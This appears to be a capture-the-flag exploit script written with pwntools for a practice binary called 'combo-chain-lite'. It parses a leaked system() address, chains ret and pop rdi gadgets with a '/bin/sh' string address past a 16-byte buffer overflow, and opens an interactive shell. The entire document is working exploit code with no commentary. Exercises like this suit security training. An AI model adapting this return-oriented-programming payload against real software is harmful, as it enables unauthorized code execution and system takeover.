from pwn import *

e = ELF('./combo-chain-lite')
p = process('./combo-chain-lite')

res = p.recvuntil('\n')
system_addr = int(res.split(' ')[4].rstrip('\n'),16)
ret_addr = 0x0040101a
binsh_addr = 0x402051
pop_rdi_addr = 0x00401273

payload = 'A'*16
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

print p.recvuntil('CARNAGE!:')
p.sendline(payload)
p.interactive()
print p.recv()